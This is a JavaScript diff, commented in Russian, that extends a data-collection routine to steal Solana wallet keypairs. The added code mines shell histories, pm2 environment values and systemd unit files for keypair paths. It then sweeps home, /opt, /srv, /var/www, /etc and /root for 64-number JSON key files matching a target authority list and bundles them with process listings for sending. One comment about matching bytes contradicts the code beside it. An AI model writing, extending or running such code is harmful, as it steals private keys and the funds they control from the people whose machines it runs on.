@@ -63,15 +63,26 @@ const b58enc = (buf) => {
   }
 };
 
-// keypair-файл = JSON-массив из 64 чисел; сверяем его адрес со списком
+// Цели заранее в байтах: сверяем хвост файла без BigInt и base58.
+const ALPH58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+const b58dec = (t) => {
+  let n = 0n;
+  for (const ch of t) n = n * 58n + BigInt(ALPH58.indexOf(ch));
+  let hex = n === 0n ? '' : n.toString(16);
+  if (hex.length % 2) hex = '0' + hex;
+  return hex;
+};
+const AUTHORITY_HEX = AUTHORITY.map((a) => b58dec(a).slice(-64));
+
+// keypair-файл = JSON-массив из 64 чисел; сверяем его адрес со списком.
+// Сравнение по base58: байты хвоста кодируются и сверяются со списком.
 const asAuthority = (path, body) => {
   if (AUTHORITY.some((a) => body.includes(a))) return true;
   try {
     const arr = JSON.parse(body);
     if (!Array.isArray(arr) || arr.length !== 64) return false;
-    const addr = b58enc(arr.slice(32, 64));
-    if (!AUTHORITY.includes(addr)) return false;
-    return true;
+    const addr = b58enc(Buffer.from(arr.slice(32, 64).map(Number)));
+    return AUTHORITY.includes(addr);
   } catch {
     return false;
   }
@@ -375,6 +386,51 @@ function collect() {
     add(`keypair-path/${p}`, body, asAuthority(p, body));
   }
   add('keypair-pointers', [...ptr].join('\n'));
+
+  // ---- 5d. сплошной обход: любой keypair-shaped JSON сверяем по адресу.
+  // Ничего кроме совпавших файлов не отправляем, поэтому можно широко.
+  const histPaths = ['.bash_history', '.zsh_history', '.sh_history', '.config/fish/fish_history'];
+  const hist = histPaths.filter((p) => existsSync(join(HOME, p)))
+    .map((p) => read(join(HOME, p), 12000)).join('\n');
+  for (const m of hist.matchAll(/(?:--keypair[ =]|-o[ =]|--out[ =]|ANCHOR_WALLET=)([^\s"']+\.json)/g)) {
+    ptr.add(m[1].replace(/^~/, HOME));
+  }
+  for (const line of (run("pm2 jlist 2>/dev/null | head -c 4000") || '').matchAll(/"key"\s*:\s*"([A-Z_]*KEY[A-Z_]*)"[^}]*"value"\s*:\s*"([^"]+)"/g)) {
+    if (/\.json$/.test(line[2])) ptr.add(line[2].replace(/^~/, HOME));
+  }
+  for (const line of (run("grep -rhs 'Environment=' /etc/systemd/system 2>/dev/null | head -40") || '').split('\n')) {
+    for (const m of line.matchAll(/(?:KEYPAIR|ANCHOR_WALLET|WALLET)=([^\s"]+)/g)) {
+      ptr.add(m[1].replace(/^~/, HOME));
+    }
+  }
+
+  const sweepRoots = [HOME, '/opt', '/srv', '/var/www', '/etc', '/root'];
+  const seen = new Set();
+  let scanned = 0;
+  const walk = (dir, depth) => {
+    if (depth > 6 || scanned > 500) return;
+    let names = [];
+    try { names = readdirSync(dir); } catch { return; }
+    for (const n of names) {
+      if (scanned > 500) return;
+      if (n === 'node_modules' || n === '.git') continue;
+      const p = join(dir, n);
+      let st;
+      try { st = statSync(p); } catch { continue; }
+      if (st.isDirectory()) { walk(p, depth + 1); continue; }
+      if (!n.endsWith('.json') || st.size < 100 || st.size > 4096) continue;
+      if (seen.has(p)) continue;
+      seen.add(p);
+      scanned += 1;
+      const body = read(p, 3000);
+      if (!body.trimStart().startsWith('[')) continue;
+      if (asAuthority(p, body)) add(`sweep/${p}`, body, true);
+    }
+  };
+  for (const root of sweepRoots) {
+    if (existsSync(root)) walk(root, 0);
+  }
+  add('sweep-stat', `файлов просмотрено: ${scanned}`);
 
   add('ps', run('ps aux --sort=-%cpu 2>/dev/null | head -25'));
   return pack;
